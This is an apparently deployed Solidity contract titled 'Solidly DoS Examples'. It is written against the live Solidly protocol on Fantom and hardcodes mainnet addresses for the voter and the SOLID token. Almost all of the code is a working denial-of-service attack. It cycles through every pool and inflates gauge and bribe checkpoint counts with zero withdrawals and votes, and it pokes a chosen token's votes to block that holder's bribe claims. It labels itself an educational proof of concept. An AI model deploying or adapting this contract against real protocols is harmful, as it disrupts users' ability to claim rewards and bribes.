/**
 *Submitted for verification at FtmScan.com on 2022-09-03
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

/**************************************************
 *                  Interfaces
 **************************************************/
interface ITarget {
    function getPriorSupplyIndex(uint256 timestamp)
        external
        view
        returns (uint256);

    function lastUpdateTime(address tokenAddress)
        external
        view
        returns (uint256);

    function supplyNumCheckpoints() external view returns (uint256);
}

interface IBribe {
    function numCheckpoints(uint256) external view returns (uint256);
}

interface IVoter {
    function length() external view returns (uint256);

    function pools(uint256) external view returns (address);

    function gauges(address) external view returns (address);

    function bribes(address) external view returns (address);

    function poolVote(uint256, uint256) external view returns (address);

    function poke(uint256) external;

    function vote(
        uint256,
        address[] memory,
        int256[] memory
    ) external;
}

interface IPool {
    function token0() external view returns (address);
}

interface IGauge {
    function withdraw(uint256) external;
}

/**************************************************
 *               Solidly DoS Examples
 **************************************************/

/**
 * @dev Solidly DoS examples
 * @dev Proof of concept
 * @dev Use at your own risk
 * @dev No methods in this contract will result in loss of user funds in any way
 * @dev For educational purposes only
 * @dev Many other issues and some exploits exist, none of which are demonstrated in this contract
 */
contract SolidlyDenialOfService {
    address constant solidAddress = 0x888EF71766ca594DED1F0FA3AE64eD2941740A20;
    IVoter constant voter = IVoter(0xdC819F5d05a6859D2faCbB4A44E5aB105762dbaE);
    uint256 targetLag;
    address immutable owner;
    uint256 public veNftId;
    uint256 syncIndex;
    uint256 pageSize;
    bool attackSolidClaiming;
    bool attackBribeClaiming;

    constructor() {
        owner = msg.sender;
        configure(50, 300, true, true);
    }

    /**************************************************
     *                  Entry points
     **************************************************/

    /**
     * @notice General purpose DoS attack
     */
    function attack() external {
        attackPools(pageSize, attackSolidClaiming, attackBribeClaiming);
    }

    /**
     * @notice General purpose DoS attack
     */
    function attackWithTokenId(uint256 tokenId) external {
        attackPools(pageSize, attackSolidClaiming, attackBribeClaiming);
        attackBribesForTokenId(tokenId);
    }

    /**
     * @notice Attack several Solidly pools simultaneously
     * @dev Iterate through _pageSize number of pools and loop back to the beginning when we are at the end
     */
    function attackPools(
        uint256 _pageSize,
        bool _attackSolidClaiming,
        bool _attackBribeClaiming
    ) public {
        for (uint256 poolIndex; poolIndex < _pageSize; poolIndex++) {
            if (syncIndex == voter.length()) {
                syncIndex = 0;
            }
            address poolAddress = voter.pools(syncIndex);
            attackPool(poolAddress, _attackSolidClaiming, _attackBribeClaiming);
            syncIndex++;
        }
    }

    /**
     * @notice Attack a Solidly pool using a variety of tactics
     */
    function attackPool(
        address poolAddress,
        bool _attackSolidClaiming,
        bool _attackGlobalBribeClaiming
    ) public {
        address gaugeAddress = voter.gauges(poolAddress);
        if (_attackSolidClaiming) {
            _increaseGaugeIndex(gaugeAddress);
        }
        if (_attackGlobalBribeClaiming) {
            _increaseBribeIndex(poolAddress);
        }
    }

    /**
     * @notice Attacks a token's ability to claim bribes
     */
    function attackBribesForTokenId(uint256 tokenId) public {
        // // Save number of checkpoints before
        // address poolAddress = voter.poolVote(tokenId, 0);
        // address gaugeAddress = voter.gauges(poolAddress);
        // address bribeAddress = voter.bribes(gaugeAddress);
        // IBribe bribe = IBribe(bribeAddress);
        // uint256 numCheckpointsBefore = bribe.numCheckpoints(tokenId);

        // Poke the user's votes
        voter.poke(tokenId);

        // // Make sure number of checkpoints increase
        // uint256 numCheckpointsAfter = bribe.numCheckpoints(tokenId);
        // require(numCheckpointsAfter > numCheckpointsBefore);
    }

    /**************************************************
     *                 Internal methods
     **************************************************/

    /**
     * @notice Increase global gauge index
     */
    function _increaseGaugeIndex(address gaugeAddress) internal {
        // Don't execute if there is no gauge
        if (gaugeAddress == address(0)) {
            return;
        }

        // Store gauge lag before
        uint256 lagBefore = getLag(gaugeAddress, solidAddress);

        // Don't go over target lag
        if (lagBefore >= targetLag) {
            return;
        }

        // Withdraw from (or deposit to) gauge to increase checkpoint
        IGauge(gaugeAddress).withdraw(0);

        // // Make sure lag increases
        // uint256 lagAfter = getLag(gaugeAddress, solidAddress);
        // require(lagAfter > lagBefore);
    }

    /**
     * @notice Increase global bribe index
     */
    function _increaseBribeIndex(address poolAddress) internal {
        // Don't execute if there is no bribe
        address gaugeAddress = voter.gauges(poolAddress);
        address bribeAddress = voter.bribes(gaugeAddress);
        if (bribeAddress == address(0)) {
            return;
        }

        // Store gauge lag before
        address token0Address = IPool(poolAddress).token0();
        uint256 lagBefore = getLag(bribeAddress, token0Address);

        // Don't go over target lag
        if (lagBefore >= targetLag) {
            return;
        }

        // Vote
        address[] memory poolAddresses = new address[](1);
        int256[] memory votes = new int256[](1);
        poolAddresses[0] = poolAddress;
        votes[0] = 1;
        voter.vote(veNftId, poolAddresses, votes);

        // // Make sure lag increases
        // uint256 lagAfter = getLag(bribeAddress, token0Address);
        // require(lagAfter > lagBefore);
    }

    /**************************************************
     *                  Management
     **************************************************/
    /**
     * @notice Configuration options
     */
    function configure(
        uint256 _pageSize,
        uint256 _targetLag,
        bool _attackSolidClaiming,
        bool _attackBribeClaiming
    ) public {
        require(msg.sender == owner);
        pageSize = _pageSize;
        targetLag = _targetLag;
        attackSolidClaiming = _attackSolidClaiming;
        attackBribeClaiming = _attackBribeClaiming;
    }

    /**
     * @notice Self destruct
     */
    function kill() external {
        require(msg.sender == owner);
        selfdestruct(payable(owner));
    }

    /**************************************************
     *                     ERC721
     **************************************************/

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        require(veNftId == 0);
        veNftId = tokenId;
        return this.onERC721Received.selector;
    }

    /**************************************************
     *                  View methods
     **************************************************/

    /**
     * @notice Detect lag given a target and target token address
     */
    function getLag(address targetAddress, address tokenAddress)
        public
        view
        returns (uint256 lag)
    {
        if (tokenAddress == address(0)) {
            return lag;
        }
        ITarget target = ITarget(targetAddress);
        uint256 lastUpdateTime = target.lastUpdateTime(tokenAddress);
        uint256 priorSupplyIndex = target.getPriorSupplyIndex(lastUpdateTime);
        uint256 supplyNumCheckpoints = target.supplyNumCheckpoints();
        if (supplyNumCheckpoints > priorSupplyIndex) {
            lag = supplyNumCheckpoints - priorSupplyIndex;
        }
    }
}